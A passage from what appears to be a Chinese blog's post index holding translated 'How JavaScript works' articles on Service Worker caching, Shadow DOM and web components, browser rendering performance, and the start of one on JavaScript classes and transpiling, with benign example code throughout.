这里有一个示例演示如何把未在白名单中的缓存删除（该情况下，以 page-1 或者 page-2 来进行命名）： 12345678910111213141516171819self.addEventListener('activate', function(event) { var cacheWhitelist = ['page-1', 'page-2']; event.waitUntil( // 获得缓存中所有键 caches.keys().then(function(cacheNames) { return Promise.all( // 遍历所有的缓存文件 cacheNames.map(function(cacheName) { // 若缓存文件不在白名单中，删除之 if (cacheWhitelist.indexOf(cacheName) === -1) { return caches.delete(cacheName); } }) ); }) );}); HTTPS 要求当处于开发阶段的时候，可以通过 localhost 来使用 Service Workers ，但在生产阶段，必须部署好 HTTPS（这也是必须使用 HTTPS 的最后一个原因了）。 使用 Service Worker，你可以劫持网络连接和构造响应数据。如果不使用 HTTPS，网络应用会容易遭受中间人 攻击。 为了保证安全，必须通过 HTTPS 在页面上注册 Service Workers，这样就可以保证浏览器接收到的 Service Worker 没有在传输过程中被篡改。 浏览器支持Service Workers 拥有良好的浏览器兼容性。 你可以追踪所有浏览器的支持进程： https://jakearchibald.github.io/isserviceworkerready/ Service Workers 提供了更多可能Service Worker 独有的功能： 推送通知－允许用户选择定时接收网络应用的推送更新 后台同步－允许延迟操作直到网络连接稳定之后。这样就可以保证用户即时发送数据。 定期同步（以后支持）－提供了管理进行定期后台数据同步的功能 Geofencing （以后支持）－可以自定义参数，也即 geofences ，该参数包含着用户所感兴趣的地区。当设备穿过某片地理围栏的时候会收到通知，这就能够让你基于用户的地理位置来提供有用的用户体验。 这里提到的功能将会该系列之后的文章中进行详细阐述。 我们持续不断地工作以让 SessionStack 的交互体验尽可能流畅，优化页面加载时间和响应时间。 当在 SessionStack 上重放用户会话或者实时流播放，SessionStack 界面会从服务器持续抓取数据从而为用户创造一个类缓冲的使用体验（类似视频缓冲）。再详细了解一些原理即一旦在网络应用中集成 SessionStack 库，它将会持续收集诸如 DOM 变化，用户交互，网络请求，未处理异常以及调试信息的数据。 当重放或者实时观看一个会话的时候，SessionStack 会返回所有数据以方便观察发生于用户浏览器的所有事件。（包括视觉上和技术上的）。所有这一切都是即时发生的，因为我们不想让用户等待。 由于数据由前端抓取的，这个时候就可以使用 Service Workers 来处理类似播放器重载和再次流传输所有数据的情形。处理缓慢网络连接也是非常重要的。 参见维基百科关于流的定义，可以帮助更好地理解这里的流的概念。 参考资源 https://developers.google.com/web/fundamentals/primers/service-workers/ https://github.com/w3c/ServiceWorker/blob/master/explainer.md","link":"/posts/c20bfe1e.html"},{"title":"探究 Shadow DOM及独立组件构建","text":"How JavaScript works: the internals of Shadow DOM + how to build self-contained components 原文请查阅这里，略有删减。 概述Web 组件指的是允许开发者使用一套不同的技术来创建可复用的自定义元素，组件内的功能独立封装，不影响其它代码，您可以在Web应用程序中使用它们。 有四种网页组件标准： Shadow DOM HTML 模板 自定义元素 HTML Imports 本章主要讨论 Shadow DOM。 Shadow DOM 是一个设计来构建基于组件(积木式)的网页程序的工具。它为开发者可能经常遇到过的问题提供了解决方案： 隔离的 DOM：组件的 DOM 是独立的(比如 document.querySelector() 不会返回组件下的 shadow DOM)。这也就简化了网页程序中的 CSS 选择器，因为 DOM 组件是互不影响，这样就允许开发者可以使用更加通用的 id/class 命名而不用担心命名冲突。 局部样式: shadow DOM 内定义的样式不会污染 shadow DOM 之外的元素。Style 样式规则不会泄漏且页面样式也不会污染 shadow DOM 内的元素样式。 组合：为开发者的组件设计一个声明式，基于标签的接口。 Shadow DOM本篇文章假设开您对 DOM 及其 API 很熟悉。否则，可以阅读一下这方面的详细资料。 和一般的 DOM 元素相比，Shadow DOM 有两处不同： 与一般创建和使用 DOM 的方式相比，开发者如何创建及使用 Shadow DOM 及其与页面上的其它元素的关系 其展现形式与页面上的其它元素的关系 一般情况下，开发者创建 DOM 节点，然后将其作为子元素挂载到其它元素下。对于 shadow DOM，开发者创建一个独立 DOM 树挂载到目标元素下而该树和其实际子元素是分离的。该独立子树称为 shadow 树。shadow 树的挂载元素称为 shadow 宿主。包括 &lt;style&gt; 在内的所有在 shadow 树下创建的任何标签都只作用于宿主元素内部。此即 shadow DOM 如何实现 CSS 局部样式的原理。 创建 Shadow DOM一个 shadow 根 即是一段挂载到 “宿主” 元素下的文档碎片。挂载了 shadow 根即表示宿主元素包含 shadow DOM。调用 element.attachShadow() 方法来为元素创建 shadow DOM: 123456var header = document.createElement('header');var shadowRoot = header.attachShadow({mode: 'open'});var paragraphElement = document.createElement('p');paragraphElement.innerText = 'Shadow DOM';shadowRoot.appendChild(paragraphElement); 规范定义了不能够创建 shadow 树的元素列表。 Shadow DOM 组合功能组合元素是 Shadow DOM 最重要的功能之一。 写 HTML 时，组合元素构建网页程序。开发者组合及嵌套诸如 &lt;div&gt;，&lt;header&gt;，&lt;form&gt; 及其它不同的构建模块来构建网页程序所需的界面。其中某些标签甚至可以互相兼容。 元素组合定义了诸如为何 &lt;select&gt;，&lt;form&gt;，&lt;video&gt; 及其它元素是可扩展的且接受特定的 HTML 元素作为子元素以便用来对这些元素进行特殊处理。 比如，&lt;select&gt; 元素知道如何把 &lt;option&gt; 元素渲染成为带有预定义选项的下拉框组件。 Shadow DOM 引入如下功能用来组合元素。 Light DOM此即组件的书写标记。该 DOM 存在于组件的 shadow DOM 之外。它是元素的实际子元素。假设开发者创建了一个名为 &lt;better-button&gt; 的自定义组件，扩展原生 button 标签及想在组件内部添加一个图片和一些文本。大概如下： 12345&lt;extended-button&gt; &lt;!-- image 和 span 即为扩展 button 的 light DOM --&gt; &lt;img src=\"boot.png\" slot=\"image\"&gt; &lt;span&gt;Launch&lt;/span&gt;&lt;/extended-button&gt; 「扩展 button」即开发者自定义组件，而其中的 HTML 即为 Light DOM 且是使用组件的用户所添加的。 这里的 Shadow DOM 即开发者创建的组件(「扩展 button」)。Shadow DOM 仅存在于组件内部且在其中定义其内部结构，局部样式及封装了组件实现详情。 扁平 DOM 树浏览器分发 light DOM 的结果即，由用户在 Shadow DOM 内部创建的 HTML 内容，这些 HTML 内容构成了自定义组件的结构，渲染出最后的产品界面。扁平树即开发者在开发者工具中看到的内容和页面的渲染结果。 123456789101112&lt;extended-button&gt; #shadow-root &lt;style&gt;…&lt;/style&gt; &lt;slot name=\"image\"&gt; &lt;img src=\"boot.png\" slot=\"image\"&gt; &lt;/slot&gt; &lt;span id=\"container\"&gt; &lt;slot&gt; &lt;span&gt;Launch&lt;/span&gt; &lt;/slot&gt; &lt;/span&gt;&lt;/extended-button&gt; 模板当开发者不得不在网页上复用相同的标记结构的时候，最好使用某种模板而不是重复书写相同的页面结构。以前是可以 hack，但现在可以使用 &lt;template&gt; (现代浏览器均兼容)元素轻易地实现该功能。该元素及其内容不会在 DOM 中渲染，但是可以使用 JavaScript 来引用其中的内容。 来看一个简单示例： 123&lt;template id=\"my-paragraph\"&gt; &lt;p&gt; Paragraph content. &lt;/p&gt;&lt;/template&gt; 上面的内容不会直接在页面中渲染，除非 JavaScript 引用到其中内容，然后使用类似如下的代码来挂载到 DOM 中： 123var template = document.getElementById('my-paragraph');var templateContent = template.content;document.body.appendChild(templateContent); 迄今为止，可以使用其它技术来实现类似的功能，但是正如之前所提到的，尽量使用原生功能来实现可能会更酷些。另外，其浏览器兼容性也不错。 本身模板就很不错，搭配自定义元素使用就更好了。我们将会另外的文章中介绍自定义元素，现在你只需了解 customElement 接口允许开发者自定义标签的渲染。 让我们定义一个使用模板作为其 shadow DOM 渲染内容的网页组件，称其为 &lt;my-paragraph&gt;: 12345678910customElements.define('my-paragraph', class extends HTMLElement { constructor() { super(); let template = document.getElementById('my-paragraph'); let templateContent = template.content; const shadowRoot = this.attachShadow({mode: 'open'}).appendChild(templateContent.cloneNode(true)); }}); 需要注意的是使用 Node.cloneNode() 方法来复制模板内容挂载到 shadow 根下。 由于把模板的内容挂载到 shadow DOM 中，开发者可以在模板中使用 &lt;style&gt; 标签包含一些样式信息，该 &lt;style&gt; 元素随后会被封装进自定义元素里面。如果直接把模板挂载到标准 DOM 里面是无效的。 比如，可以更改模板内容为如下： 12345678910&lt;template id=\"my-paragraph\"&gt; &lt;style&gt; p { color: white; background-color: #666; padding: 5px; } &lt;/style&gt; &lt;p&gt;Paragraph content. &lt;/p&gt;&lt;/template&gt; 现在可以以如下方式使用刚才使用模板创建的自定义组件了： &lt;my-paragraph&gt;&lt;/my-paragraph&gt; 插槽模板有一些不足的地方，主要在于静态内容不允许开发者像一般的标准 HTML 模板那样渲染自定义的变量或者数据。 这时候 &lt;slot&gt; 就派上用场了。 你可以把插槽看成是允许开发者在模板中放置自定义 HTML 的占位符的功能。这样开发者就可以创建能用的 HTML 模板并且通过引入插槽来自定义渲染内容。 让我们看一下上面模板添加一个插槽的代码如下： 12345&lt;template id=\"my-paragraph\"&gt; &lt;p&gt; &lt;slot name=\"my-text\"&gt;Default text&lt;/slot&gt; &lt;/p&gt;&lt;/template&gt; 如果在标记中引用该元素时没有定义插槽内容，或者浏览器不支持插槽，则 &lt;my-paragraph&gt; 只会包含默认的 “Default text” 内容。 若想要定义插槽内容，开发者得在 &lt;my-paragraph&gt; 中定义元素 HTML 结构的 slot 属性值和对应填充的插槽名称保持一致即可。 如前所述，开发者可以随便写插槽内容： 123&lt;my-paragraph&gt; &lt;span slot=\"my-text\"&gt;Let's have some different text!&lt;/span&gt;&lt;/my-paragraph&gt; 所有可以被插入插槽的元素被称为可插入元素；已插入插槽元素称为插槽元素。 注意以上示例中插入的 &lt;span&gt; 元素即是插槽元素。它拥有一个 slot 属性，属性值和模板中插槽定义的 name 属性值相等。 浏览器渲染之后，以上代码会创建如下扁平 DOM 树： 12345678&lt;my-paragraph&gt; #shadow-root &lt;p&gt; &lt;slot name=\"my-text\"&gt; &lt;span slot=\"my-text\"&gt;Let's have some different text!&lt;/span&gt; &lt;/slot&gt; &lt;/p&gt;&lt;/my-paragraph&gt; 注意 #shadow-root 元素只是表示存在 Shadow DOM 而已。 样式使用shadow DOM 的组件可以在主页面进行样式调整 ，可以定义组件样式或者提供 CSS 自定义属性的形式让用户覆盖掉默认样式值。 组件定义样式局部样式 是 Shadow DOM 极好的功能之一： 主页面上的 CSS 选择器不会影响到组件内部元素的样式。 组件内部定义的样式不会影响页面上的其它元素样式。它们只作用于宿主元素。 Shadow DOM 中的 CSS 选择器只影响组件内部的元素。实际上，这意味着开发者可以重复使用通用的 id/class 名称而不用担心和主页面上的其它样式发生冲突。简单的 CSS 选择器可以提高页面性能。 让我们看一下如下 #shadow-root 中定义的一些样式： 123456789101112#shadow-root&lt;style&gt; #container { background: white; } #container-items { display: inline-flex; }&lt;/style&gt;&lt;div id=\"container\"&gt;&lt;/div&gt;&lt;div id=\"container-items\"&gt;&lt;/div&gt; 以上示例中的样式只会作用于 #shadow-root 内。 开发者也可以在 #shadow-root 里面使用 元素来引入样式表，也只作用于 #shadow-root 内部。 :host 伪类:host 伪类允许开发者选择和样式化包含 shadow 树的宿主元素： 12345&lt;style&gt; :host { display: block; /* 默认情况下, 自定义元素是内联元素 */ }&lt;/style&gt; 还有一件事:需要注意即若主页面上定义的宿主元素样式优先级比元素里面定义的 :host 样式规则要高。这样就允许开发者从外部覆盖掉组件内部定义的顶级样式。同理，:host 只在shadow 根的上下文中起作用，因此开发者不能够在 Shadow DOM 外面使用。 :host(&lt;selector&gt;) 这样的功能样式允许开发者只样式化匹配 &lt;selector&gt; 的宿主元素。这是一个绝佳的方式，开发者可以在组件内部封装响应用户交互或者状态的行为，然后基于宿主元素来样式化内部节点。 12345678910111213141516171819&lt;style&gt; :host { opacity: 0.4; } :host(:hover) { opacity: 1; } :host([disabled]) { /* 宿主元素拥有 disabled 属性的样式. */ background: grey; pointer-events: none; opacity: 0.4; } :host(.pink) &gt; #tabs { color: pink; /* 当宿主元素含有 pink 类时的选项卡样式. */ }&lt;/style&gt; 使用 :host-context() 伪类来定制化元素样式:host-context(&lt;selector&gt;) 伪类找出宿主元素或者宿主元素任意的祖先元素匹配 &lt;selector&gt;。 常用于主题定制。例如，开发者通过为 &lt;html&gt; 或者 &lt;body&gt; 添加类来进行定制化： 12345&lt;body class=\"lightheme\"&gt; &lt;custom-container&gt; … &lt;/custom-container&gt;&lt;/body&gt; 当宿主元素的祖先元素包含有 .lightheme 类 :host-context(.lightheme) 将会样式化 &lt;fancy-tabs&gt;： 1234:host-context(.lightheme) { color: black; background: white;} 可以使用 :host-context() 来进行定制化主题样式，但还有一个更好的方法即通过 CSS 自定义属性来创建样式钩子。 从外部样式化组件宿主元素你可以在外部通过把标签名作为选择器来样式化组件宿主元素，如下： 123custom-container { color: red;} 外部样式比 Shadow DOM 中定义的样式拥有更高的优先级。 例如，假设用户写如下选择器： 123custom-container { width: 500px;} 将会覆盖如下组件样式规则 ： 123:host { width: 300px;} 组件自身样式化只能做到这么多。但如果想要样式化组件内部属性呢？这就需要 CSS 自定义属性。 使用 CSS 自定义属性来创建样式钩子若组件作者使用 CSS 自定义属性提供样式钩子，用户可以用来调整内部样式。 这和 &lt;slot&gt; 思路类似只是应用到了样式。 让我们看如下示例： 123456789&lt;!-- 主页面 --&gt;&lt;style&gt; custom-container { margin-bottom: 60px; --custom-container-bg: black; }&lt;/style&gt;&lt;custom-container background&gt;…&lt;/custom-container&gt; Shadow DOM 内部： 12345:host([background]) { background: var(--custom-container-bg, #CECECE); border-radius: 10px; padding: 10px;} 在该示例中，因为用户提供了该背景颜色值，所以组件将会把黑色作为背景颜色值。否则，默认为 #CECECE。 作为组件作者，需要让开发者知道有可以使用的 CSS 自定义属性。可以把自定义属性看作组件的公共接口。 插槽 JavaScript 接口Shadow DOM API 提供了插槽操作的能力。 slotchange 事件当一个插槽的分发元素节点发生变化的时候触发 slotchange 事件。例如，当用户从 light DOM 中添加/删除子节点。 1234var slot = this.shadowRoot.querySelector('#some_slot');slot.addEventListener('slotchange', function(e) { console.log('Light DOM change');}); 可以在元素的构造函数中创建 MutationObserver 来监听 light DOM 的其它类型的修改事件。前面文章有介绍过 使用MutationObserver监测DOM。 assignedNodes() 方法了解哪些元素是和插槽有关是很有用处的。调用 slot.assignedNodes() 可以找出哪些元素是由插槽渲染的。flatten: true} 选项会返回插槽的默认内容(若没有分发任何节点)。 请看如下示例： 1&lt;slot name='slot1'&gt;&lt;p&gt;Default content&lt;/p&gt;&lt;/slot&gt; 假设以上包含在一个叫做 &lt;my-container&gt; 的组件内部。 让我们查看一下该组件的不同用法，然后调用 assignedNodes() 输出不同的结果： 第一个例子，我们将往插槽中添加内容： 123&lt;my-container&gt; &lt;span slot=\"slot1\"&gt; container text &lt;/span&gt;&lt;/my-container&gt; 调用 assignedNodes() 将会返回 [&lt;span slot=&quot;slot1&quot;&gt; container text &lt;/span&gt;]。注意结果为一个节点数组。 第二个例子，将不添加内容： &lt;my-container&gt; &lt;/my-container&gt; 调用 assignedNodes() 将会返回空数组 []。 但是，假如添加 {flatten: true} 参数将会返回默认内容：[&lt;p&gt;Default content&lt;/p&gt;]。 同理，为了查找插槽中的元素，开发者可以调用 assignedNodes() 来找出元素被挂载到哪个组件插槽中。 事件模型Shadow DOM 中的事件冒泡的经过是值得一提。 事件目标被调整为维护 Shadow DOM 的封闭性。当事件被重新定位，看起来是由组件自身产生而不是组件的 Shadow DOM 内部元素。 这里有传播出 Shadow DOM 的事件列表(还有一些只能在 Shadow DOM 内传播)： Focus 事件：blur, focus, focusin, focusout 鼠标事件：click, dblclick, mousedown, mouseenter, mousemove 等. 滚轮事件: wheel 输入事件: beforeinput, input 键盘事件: keydown, keyup 组合事件: compositionstart, compositionupdate, compositionend 拖拽事件: dragstart, drag, dragend, drop 等. 自定义事件自定义事件默认不会传播出 Shadow DOM。开发者若想要分派自定义事件且想要传播出 Shadow DOM，需要添加 bubbles: true 和 composed: true 选项参数。 让我们看下类似这样的事件分派： 12var container = this.shadowRoot.querySelector('#container');container.dispatchEvent(new Event('containerchanged', {bubbles: true, composed: true})); 浏览器兼容情况可以通过检查 attachShadow 来检查是否支持 Shadow DOM 功能： 1const supportsShadowDOMV1 = !!HTMLElement.prototype.attachShadow; 参考资料： https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_shadow_DOM https://developers.google.com/web/fundamentals/web-components/shadowdom https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_templates_and_slots https://www.html5rocks.com/en/tutorials/webcomponents/shadowdom-201/#toc-style-host","link":"/posts/7af46885.html"},{"title":"渲染引擎及性能优化技巧","text":"How JavaScript works: the rendering engine and tips to optimize its performance 原文请查阅这里，略有删减。 迄今为止，JavaScript 工作原理系列文章主要关注 JavaScript 语言本身的功能，在浏览器中的执行情况，及如何优化等。 当构建网络应用时，你不只编写独立运行的 JavaScript 代码。代码与运行环境息息相关, 甚至可以认为浏览器就是 Javascript 的操作系统。理解 JavaScript 运行环境，它的运行原理以及其组成会让你构建出更好的应用。一旦应用程序运行于各种环境时，让你更加信心应对可能出现的潜在问题。 浏览器主要组件有： 用户界面: 包括地址栏，后退和前进按钮，书签菜单等。本质上，这里包含了除显示用户所看到的网页本身的窗口以外的浏览器的所有部分。 浏览器引擎: 处理用户界面和渲染引擎的交互 渲染引擎: 负责渲染网页。引擎解析 HTML 和 CSS 并在屏幕上显示解析后的内容。 网络: 使用各种平台的不同实现所发起的诸如 XHR 请求的网络调用，这些网络调用是基于跨平台的接口实现的。 UI 后端: 负责绘制诸如复选框和窗口的核心部件。它暴露出一个平台无关的泛型接口。它底层使用操作系统 UI 方法。 JavaScript 引擎: 我们在之前的第二章中有详细介绍过。基本上，这是 JavaScript 代码执行的地方。 数据存储: 网络应用可能需要本地存储所有数据。支持的存储机制类型包括 localStorage, indexDB, WebSQL 以及 FileSystem。 本章专注介绍渲染引擎，因为它是用来处理 HTML 和 CSS 的解析和可视化的，而这些是大多数的 JavaScript 应用需要持续进行交互的方面。 渲染引擎概述渲染引擎的主要职责即在浏览器屏幕上显示请求的页面。 渲染引擎可以显示 HTML，XML 文档以及图片。如果使用额外插件，就可以显示如 PDF 的其他类型的文档。 渲染引擎与 JavaScript 引擎类似，不同浏览器也使用不同的渲染引擎。以下为比较流行的引擎： Gecko－Firefox WebKit－Safari Blink－Chrome, Opera(从版本 15 开始) 渲染过程渲染引擎从网络层获取到请求的文档内容。 构建 DOM 树渲染引擎的第一步即解析 HTML 文档和转化解析的元素为 DOM 树上的实际 DOM 节点。 假设有如下的文本输入框： 123456789101112&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"theme.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; Hello, &lt;span&gt; friend! &lt;/span&gt; &lt;/p&gt; &lt;div&gt; &lt;img src=\"smiley.gif\" alt=\"Smiley face\" height=\"42\" width=\"42\"&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; HTML 的 DOM 树类似这样： 基本上，每个元素是直接包含于其内的元素的父节点。然后依次递归。 构建 CSSOM 树CSSOM 即 CSS Object Model。当浏览器构建页面的 DOM 树的时候，它在 head 标签部分遇到一个引用外部 theme.css 样式表的 link 标签。表示它可能需要样式表来渲染页面，于是便马上分派一个请求来获取样式表。假设以下为 theme.css 文件内容： 12345678910111213141516171819body { font-size: 16px;}p { font-weight: bold; }span { color: red; }p span { display: none; }img { float: right; } 与 HTML 一样，渲染引擎需要把 CSS 转化为浏览器可以操作的东西－即 CSSOM。以下为 CSSOM 的大概模样： 为什么 CSSOM 是树状结构？当为页面上的任意对象计算其最终的样式集的时候，浏览器先把最为通用的样式规则应用于该节点（比如，它是 body 的子节点，会先应用 body 的所有样式）然后通过应用更为具体的样式规则来递归重定义计算的样式。 让我们看下具体的例子吧。body 中的 span 标签中的任何文字样式为字体大小 16 像素且字体颜色为红色。这些样式继承自 body 元素。p 元素的子元素 span 由于应用了更为具体的样式从而不会显示其内容(display:none)。 还有，请注意以上 CSSOM 树并不完整而且只显示了样式表中指定的重写样式。每个浏览器提供了一份默认的样式集即 『用户代理样式』－ 这即当没有提供任何样式的时候的默认显示样式。我们的样式只是简单地重写了这些默认样式。 构建渲染树HTML 中的可视化指令和 CSSOM 树的样式数据结合起来创建渲染树。 你可能会问渲染树是什么？它是按顺序构建可视化元素并显示在屏幕上的树。它是带有相应的样式的 HTML 的视觉表现。该树旨在按正确的顺序绘制内容。 在 Webkit 中渲染树中的每个节点即是一个渲染器或者渲染器对象。 以下为以上的 DOM 和 CSSOM 树合成的渲染器树的大概模样： 为了创建渲染树，浏览器大概做了以下几件事： 从 DOM 树的根节点开始，遍历每个可见节点。部分节点是不可见的（比如，script 标签，meta 标签等等），会被忽略，因为它们并不会在渲染的输出中显示。一些节点通过样式隐藏然后也会被忽略。比如以上例子中的 span 节点，因为为其显式设置了 display: none 的样式。 浏览器为每个可见节点应用对应的 CSSOM 规则。 释放出包含内容及其经过计算的样式的可见节点。 可以浏览下 RenderObject 的源码(Webkit 中)：https://github.com/WebKit/webkit/blob/fde57e46b1f8d7dde4b2006aaf7ebe5a09a6984b/Source/WebCore/rendering/RenderObject.h 看一下这个类的一些核心构件吧： 12345678910class RenderObject : public CachedImageClient { // 重绘整个对象。当边框颜色改变或者边框样式更改的时候调用。 Node* node() const { ... } RenderStyle* style; // 计算的样式 const RenderStyle&amp; style() const; ...} 每个渲染器对象代表一个矩形区域通常是和一个节点的 CSS 盒模型相对应。它包括宽度，高度以及定位的几何信息。 渲染树布局当创建了渲染器并且添加到渲染树的时候，它并没有定位和大小的信息。计算这些值即称为布局。 HTML 使用了流式布局模型，意即大多数情况下可以一次性计算出渲染器的几何信息。坐标系统是相对于根渲染器的。这里使用 top 和 left 坐标。 布局是一个递归的过程－它从根渲染器开始进行渲染，根渲染器即 HTML 文档的 html 元素。布局继续通过一部分或者整个渲染器层级结构递归进行，为每个需要计算几何信息的渲染器计算其信息。 根渲染器的定位为 0,0 和大小即为浏览器窗口的可视化部分(比如 viewport)。 进行布局的过程即计算出每个节点在屏幕上显示的准确位置。 绘制渲染树此阶段，遍历渲染器树然后调用渲染器的 paint() 方法来在屏幕上显示其内容。 绘制可以是全局或增量式的(类似于布局)： 全局－重绘整个树。 增量－以某种方式只更改部分渲染器而不会影响到整颗树。渲染器作废其在屏幕上的矩形区域。这会导致操作系统把它看成是一个需要重绘的区域并生成一个 paint 事件。操作系统会智能地把几个区域合并成一个以提升渲染性能。 总之，理解绘制是个渐进式的过程是很重要的。为了更好的交互体验，渲染引擎会试图尽快在屏幕上显示内容。它不会等待所有的 HTML 结构解析完成才开始构建和布局渲染树。会优先解析和显示部分内容，与此同时持续处理从网络接收的剩下的内容。 脚本和样式的处理顺序当解析器遇到 &lt;script&gt; 标签的时候会立即解析和执行该标签里面的代码。整个文档的解析会停止直到脚本执行完毕。意味着该过程是同步的。 当 script 引用的是一个外部资源，必须首先获取该资源(也是同步的)。所有的解析会停止直到获取该脚本资源。 HTML5 添加了一个选项来异步加载该资源，这样就可以使用另外的线程来解析和执行该资源。IE 可以使用 defer属性，其它可以使用 async 属性。IE10 以下使用 defer 属性，IE10 以上也可以使用 async 属性。 优化渲染性能若想要优化网络应用的性能，需要关注五个主要的方面。这些方面是你可以进行控制的： JavaScript－之前的文章中有介绍了编写不阻塞 UI - 高效记忆等等。谈到渲染时，需要考虑 JavaScript 代码是如何与页面上的 DOM 元素进行交互的。JavaScript 会在界面上产生很多变更，特别是在单页面应用(SPA)中。 样式计算－这个过程即应用样式规则到匹配选择器的元素上。一旦定义了样式规则，它们会应用于对应元素，然后计算每个元素的最终样式。 布局－一旦浏览器了解元素所应用的样式规则，它会开始计算元素所占用的空间和其在浏览器屏幕上的显示位置。根据网页的布局模型定义一个元素的布局会影响到其它的元素。比如，&lt;body&gt; 标签的宽度会影响到其子孙元素的宽度等等。这即意味着布局过程是相当耗时的。绘制是在多个图层完成的。 绘制－该阶段即开始填充实际像素。这一过程包括绘制文字，颜色，图片，边框，阴影等所有每个元素的可见部分。 合成－因为页面部分被绘制成潜在的多层，它们必须在屏幕以正确的顺序进行绘制，这样页面渲染才会正常。这是至关重要的，特别是对于那些重叠元素。 优化 JavaScript 代码JavaScript 经常会在浏览器端触发视觉改变。尤其是在构建 SPA 的过程中会出现得更多。 这里有一些优化 JavaScript 中部分代码来提升渲染效率的建议： 避免使用 setTimeout 或者 setInterval 来进行视觉的更改。这些会在帧的某个时间点调用 callback，有可能是在帧的末尾。这样就会造成卡顿。必须在帧的开始触发视觉更改。 把耗时的 JavaScript 移入之前提到的Web Workers。 使用微任务来处理跨多个帧的 DOM 变动。这是为了预防当任务需要访问 DOM，而网络工作线程无法访问到的情况的。意即需要把一个大型的任务分割为多个小任务然后根据不同的任务性质在 requestAnimationFrame ，setTimeout 或 setInterval 中执行。 CSS 优化通过添加和移除元素及更改属性等修改 DOM 会导致浏览器重新计算元素样式及大多数情况整个页面或者部分页面的布局。 使用以下方法来优化渲染： 减少选择器的复杂度。选择器复杂度会占用超过计算所需元素样式的 50% 的时间，剩余时间即构建样式本身。 减少必须产生样式计算的元素的个数。本质上，直接更改少数元素的样式而不是使整个页面的样式失效。 优化布局布局重计算是很耗费浏览器性能的。考虑以下优化方案： 尽可能减少布局的数量。当更改样式的时候，浏览器检查样式更改是否需要重新计算布局。一般而言更改诸如 width, height, left, top 等和几何学相关的属性会需要布局。所以，尽可能避免修改它们。 尽可能使用 flexbox 来进行布局而不是老式的布局模型。它会渲染得更快并且会极大地提升网络应用的性能。 避免强制同步布局。需要记住的是当运行 JavaScript的时候，上一帧的老的布局值是已知的且可以被查询得到。当访问 box.offsetHeight 这并不会造成性能问题。然而，如果在访问它之前更改它的样式(比如为元素动态添加样式类)，浏览器将不得不首先应用样式更改然后运行布局计算样式。这将会非常耗时和耗资源，尽量避免这样做。 优化绘制这经常会是所有任务中最耗时的，所以尽量避免触发绘制。优化方案： 更改除 transfroms 或者 opacity 外的属性会触发绘制，慎用。 触发一次布局的同时也会触发绘制，因为更改元素的几何信息会更改元素的展示效果。 通过提升绘制层和动画编排来减少绘制区域。 参考资源 https://developers.google.com/web/fundamentals/performance/critical-rendering-path/constructing-the-object-model https://developers.google.com/web/fundamentals/performance/rendering/reduce-the-scope-and-complexity-of-style-calculations https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/#The_parsing_algorithm","link":"/posts/693804ca.html"},{"title":"类,继承探究及Babel&#x2F;TypeScript代码转译","text":"How JavaScript works: The internals of classes and inheritance + transpiling in Babel and TypeScript 原文请查阅这里，略有删减。 使用类来组织各种软件工程代码是如今最常用的方法。本章将会探索实现 JavaScript 类的不同方法及如何构建类继承。我们将深入理解原型继承及分析使用流行的类库模拟实现基于类继承的方法。接下来，将会介绍如何使用转换器为语言添加非原生支持的语法功能和如何在 Babel 和 TypeScript 中运用以支持 ECMAScript 2015 类。最后介绍几个 V8 原生支持实现类的例子。 概述JavaScript 没有原始类型且万物皆对象。比如，如下字符串： 1const name = \"SessionStack\"; 可以立即调用新创建对象上的不同方法： 12console.log(a.repeat(2)); // 输出 SessionStackSessionStackconsole.log(a.toLowerCase()); // 输出 sessionstack JavaScript 和其它语言不一样，声明一个字符串或者数值会自动创建一个包含值的对象及提供甚至可以在原始类型上运行的不同方法。 另外一个有趣的事实是数组的复杂数据类型也是对象。当使用 typeof 来检查一个数组实例的时候会输出 object。数组中每个元素的索引值即对象的属性。所以通过数组索引来访问元素的时候，实际上是在访问一个数组对象的属性然后获得属性值。当涉及到数据存储方式的时候，以下两种定义是相同的： 123456let names = [“SessionStack”];let names = { “0”: “SessionStack”, “length”: 1} 因此，访问数组元素和对象属性的速度是一样的。我走了很多弯路才发现该事实。以前有段时间，我得对项目中某段至关重要的代码进行大量的性能优化。当试验过其它简单的办法之后，我把所有的对象替换为数组。理论上访问数组元素会比访问哈希图的键值更快。然而，我惊奇地发现没有半点性能的提升。在 JavaScript 中，所有的操作都是由访问哈希图中的键来实现的且耗时相同。 使用原型模拟类当谈到对象的时候，第一印象只能是类。开发人员习惯于使用类和类之间的关联来组织程序。虽然 JavaScript 中一切皆对象，但是并没有使用经典的基于类的继承。而是使用原型来实现继承。 在 JavaScript 中，每个对象都关联着其他对象。当访问对象的一个方法或属性的时候，首先在对象自身进行搜索。如果没有找到，则在对象原型上进行查找(原型链)。 让我们以定义基础类的构造函数为例： 1234567function Component(content) { this.content = content;}Component.prototype.render = function() { console.log(this.content);} 在原型上添加 render 函数因为我们希望 Component 的实例就可以使用该方法。当调用该 Component 类实例的方法的时候，首先在实例上查询该方法。然后在原型上找到该渲染方法。 现在尝试扩展 component 类，引入新的子类。 123function InputField(value) { this.content = `&lt;input type=\"text\" value=\"${value}\" /&gt;`;} 如果想要 InputField 扩展 component 类的方法且可以调用其 render 方法，就需要更改其原型。当子类的实例方法被调用时，肯定不希望在一个空原型上进行查找(这里其实所有对象都一个共同的原型，这里原文不够严谨)。该查找会延续到 Component 类上。 1InputField.prototype = Object.create(new Component()); 这样，就可以在 Component 类的原型上找到 render 方法。为了实现继承，需要把 InputField 的原型设置为Component 类的实例。大多数库使用 Object.setPrototypeOf 来实现继承。 然而还有其它事情需要做。每次扩展类，所需要做的事如下： 设置子类的原型为父类的实例 在子类的构建函数中调用父类构造函数，这样才可以执行父类构造函数的初始化逻辑。 引入访问父类的方法。当重写父类方法的时候，会想要调用父类方法的原始实现。 如你所见，当想要实现所有基于类继承的功能的时候，每次都需要执行这么复杂的逻辑步骤。当需要创建这么多类的时候，即意味着需要把这些逻辑封装为可重用的函数。这就是开发者当初通过各种类库来模拟从而解决基于类的继承的问题。这些解决方案是如此流行，以至于迫切需要语言集成该功能。这就是为什么 ECMAScript 2015 的第一个重要修订版中引入了支持基于类继承的创建类的语法。 类转译当在 ES6 或者 ECMAScript 2015 中提议新功能时，JavaScript 